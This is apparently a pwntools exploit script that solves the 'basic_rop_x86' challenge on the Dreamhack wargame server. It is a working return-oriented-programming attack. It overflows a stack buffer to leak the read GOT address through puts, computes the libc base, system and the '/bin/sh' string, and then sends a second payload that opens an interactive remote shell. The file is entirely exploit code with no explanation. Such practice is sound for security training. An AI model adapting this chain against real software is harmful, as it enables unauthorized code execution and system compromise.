from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 19667)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')


read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
main = e.symbols['main']
pop = 0x0804868b

# puts(read_got)
payload = b'A' * 0x48
payload += p32(puts_plt)
payload += p32(pop)
payload += p32(read_got)
payload += p32(main)
p.send(payload)

# read_got extract
read = u32(p.recvuntil(b'\xf7')[-4:])
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + 0x1b90f5

slog('libc base', lb)
slog('read', read)
slog('system', system)
slog('binsh', binsh)

# restart main
payload = b'A' * 0x48
payload += p32(system)
payload += p32(pop)
payload += p32(binsh)
p.send(payload)

p.interactive()